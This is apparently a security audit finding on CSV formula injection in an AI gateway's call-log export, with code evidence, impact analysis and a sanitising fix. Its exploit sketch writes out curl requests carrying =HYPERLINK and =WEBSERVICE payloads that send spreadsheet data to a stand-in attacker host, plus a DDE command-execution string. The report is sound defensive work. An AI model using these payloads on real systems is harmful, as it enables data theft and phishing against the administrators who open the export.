category: CWE-1236 CSV formula injection (improper neutralisation of export cell prefix)
title: Tenant-controlled X-Request-ID and unresolved model strings are written unescaped into the call-logs CSV export, becoming live formulas when an admin opens it in a spreadsheet
evidence: audit.go:99 `w := csv.NewWriter(&sb)` — no cell-prefix neutralisation helper exists anywhere in backend/ (grep `csv\.NewWriter|csvCell|formula|CsvSafe|SanitizeCSV|escapeCSV` returns only the 4 writer call sites: audit.go:99, audit.go:177, tokenstats.go:273, guard.go:135).

audit.go:102 `w.Write([]string{r.RequestID, r.CreatedAt.Format(time.RFC3339), r.APIKeyLabel, r.Protocol,` continuing to 105 `strconv.FormatInt(r.LatencyMs, 10), r.Status, strconv.FormatBool(r.Blocked), r.BlockReason})` — `r.RequestID` (column 1) and `r.ModelAlias` (column 5) are the two gateway-tenant-controlled cells.

gateway.go:84 `if v := strings.TrimSpace(c.GetHeader("X-Request-ID")); v != "" && len(v) <= 128 {` then `return v` — length-only admission of an attacker-chosen request_id; gateway.go:308 `c.Header("X-Request-ID", reqID)` echoes it so the caller can confirm placement.

gateway.go:334 `ap.alias = cr.Model` — set BEFORE alias lookup (335), context-suffix strip (339-346), implicit upstream resolution (351-354) and the 404 return (348-362), so the unresolvable attacker string is what is audited.

persistence: gateway.go:314-317 `defer func() { if shouldAuditCall(snap.General, ap.status) { s.writeLog(ap) } }()` with ap.status initialised to "error" (312) and gateway.go:257-259 `if status != "ok" { return true }`; out of the box every call is audited: settings.go:31-33 `CallAuditEnabled: true, CallAuditSampling: 1` (CallAuditOnlyErrors zero-value false).

no truncation on the write path: gateway.go:270-272 `cl := &model.CallLog{ RequestID: p.requestID, ... ModelAlias: p.alias, ...}` -> audit/audit.go:37-47 `func (l *Logger) Write(cl *model.CallLog)` and 67 `l.db.CreateInBatches(batch, 50)`; GORM width tags model.go:248 `gorm:"uniqueIndex;size:40"` / 253 `gorm:"size:64;index"` are DDL hints SQLite does not enforce, and real payloads fit them anyway.

delivery: audit.go:108 `c.Header("Content-Disposition", "attachment; filename=call-logs.csv")`, audit.go:109 `c.Data(http.StatusOK, "text/csv; charset=utf-8", []byte("\uFEFF"+sb.String()))` (BOM fixes charset sniffing only), routes.go:113 `api.GET("/audit/calls/export", s.AuthMiddleware(), s.exportCallLogs)` -> endpoints.ts:200-204 `downloadFile('/audit/calls/export', {...})` -> client.ts:126 `responseType: 'blob'` -> client.ts:141 `a.download = filename;`.
adapter.go:120-122 `if raw.Model == "" { return nil, fmt.Errorf("model is required") }` — the only validation the model string ever receives.
impact: A low-privilege gateway tenant (API-key holder, no admin rights) can plant attacker-chosen spreadsheet formulas in an official-looking audit artifact that a privileged analyst downloads and opens. Because Go's csv.Writer only RFC-4180-quotes a leading `=` (never neutralises it), the cell evaluates on open: HYPERLINK/WEBSERVICE-class disclosure of the other rows in that sheet (other tenants' request IDs, API-key labels, model aliases, block reasons) and a phishing-grade `https://login.corp/` hyperlink rendered inside admin-authored data; the DDE variant (`cmd|'/C calc'!A0`) is the code-execution path but is blocked by default in current Excel Trust Center. The 404 path returns before rate limiting (gateway.go:410 is step 3, after model resolution), so rows can be seeded without bound. Blast radius is bounded by what the export actually carries: audit.go:100 is an 11-column metadata header, no credentials, and prompt/completion text never reaches a CSV writer (grep `InputText|OutputText` in admin/ -> only the JSON detail API at audit.go:81-82).
mitigations_checked: SQL: parameterised everywhere (audit.go:116-137 bound `?` values; `q.Order("created_at DESC")` static), so these strings cannot become SQL.
DOM: no XSS alternative sink — grep `dangerouslySetInnerHTML|innerHTML|new RegExp|eval\(` over frontend/src returns zero matches, so the console renders these strings as React children.

Prometheus: /metrics does escape label values (prom.go:43-45 `func promEsc(s string) string { return strings.NewReplacer(\`\\\`, \`\\\\\`, ...) }`), which is exactly the discipline missing from the CSV exit.
Header row-splitting: not possible — a header value cannot carry CR/LF, and csv.Writer quotes any embedded newline, so the risk is formula evaluation, not extra rows.
Attribution: gateway.go:311 `keyLabel: apiKey.Name` records the injecting tenant's own key label/ID in every poisoned row, making the attack self-identifying.
Not a mitigation: the BOM at audit.go:109; RFC-4180 quoting by csv.Writer; the `size:40`/`size:64` tags on SQLite.
scope_note: The three other exports share the identical unescaped writer pattern and must get the same helper, but only call-logs crosses a privilege boundary: tokenstats.go:276-277 writes `r.label` = `model.APIKey.Name` (tokenstats.go:258 / gateway.go:311), guard.go:138 writes admin-authored `r.Word` (guard.go:44-61), audit.go:180-181 writes JWT subject / `u.Username` (auth.go:132, successful logins only — the 401 paths at auth.go:35,78 never call recordOp, so there is no unauthenticated variant), admin config JSON and server-derived IP; and the BlockReason column at audit.go:105 embeds only admin-authored rule text (engine.go:81/103/117/139 with `f.Value = display(kw.Raw.Word)` from engine.go:77), never attacker prompt text.
recommendation: Add one shared helper and route every field of all four writers through it: `func csvCell(s string) string { if s == "" { return s }; switch s[0] { case '=', '+', '-', '\t', '\r': return "'" + s }; return s }` — applied at audit.go:102, audit.go:180, tokenstats.go:276, guard.go:138. A leading-quote (or tab) prefix is required; Go's own quoting is not enough. Additionally, stop trusting client-supplied correlation IDs for exported identity: either reject `X-Request-ID` that does not match `^[A-Za-z0-9._-]{1,40}$` at gateway.go:84, or store the client value in a separate non-exported column and always export the generated hex ID from gateway.go:75-79. Finally, enforce the declared widths (40/64) at writeLog so SQLite and MySQL/Postgres deployments behave identically.
exploit_sketch:
Precondition: attacker holds any valid gateway API key; stock settings (settings.go:33).

1. Poison the model column (audit.go:103) via the unresolvable-model path, which returns before guard/rate-limit/quota:
   curl -sS https://gateway.example.com/v1/chat/completions \
     -H 'Authorization: Bearer sk-<own-key>' -H 'Content-Type: application/json' \
     -d '{"model":"=HYPERLINK("http://attacker.tld/leak?r="&A2)","messages":[{"role":"user","content":"hi"}]}'
   -> 404 to the caller, one poisoned committed row.
2. Poison column 1 (request_id) on a call that can even succeed:
   curl -sS .../v1/chat/completions -H 'Authorization: Bearer sk-<own-key>' \
     -H "X-Request-ID: =WEBSERVICE('http://attacker.tld/c?k='+LEFT(A2,64))" \
     -H 'Content-Type: application/json' -d '{"model":"gpt-mini","messages":[{"role":"user","content":"hi"}]}'
3. Analyst later clicks 导出 CSV (endpoints.ts:200-204); Excel opens call-logs.csv (audit.go:108) in Protected View, one "Enable Editing" click activates the formula -> adjacent-cell data to attacker.tld, or a spoofed corporate hyperlink in admin-authored data. `@SUM(1+1)+cmd|'/C calc'!A0` escalates to DDE only where DDE is not blocked by policy.

Severity held at medium rather than high: three chained victim actions (export, desktop-spreadsheet open, Enable Editing), DDE off by default, no credentials or prompt text inside the exported columns, and full attribution of the injecting key.
verified_against_finding: injection-1 (peer auditor) — chain confirmed, evidence quotes verbatim-accurate, canonical line 102 exact; downgraded high -> medium and scope narrowed to the two call-logs columns.
